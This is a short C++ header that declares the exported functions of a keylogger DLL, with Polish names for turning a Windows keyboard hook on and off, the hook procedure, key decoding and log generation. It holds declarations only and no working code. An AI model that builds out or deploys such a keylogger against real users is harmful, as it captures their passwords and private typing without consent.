#ifndef KEYLOGGER_DLL
#define KEYLOGGER_DLL __declspec(dllimport)
#endif

#include <Windows.h>
#include <fstream>
#include <iostream>

extern "C"
{
	KEYLOGGER_DLL char* Klawisz(LPARAM lParam);

	KEYLOGGER_DLL void WlaczHook();

	KEYLOGGER_DLL void WylaczHook();

	KEYLOGGER_DLL LRESULT CALLBACK ProceduraHaka(int code, WPARAM wParam, LPARAM lParam);

	KEYLOGGER_DLL void GenerujLog();

}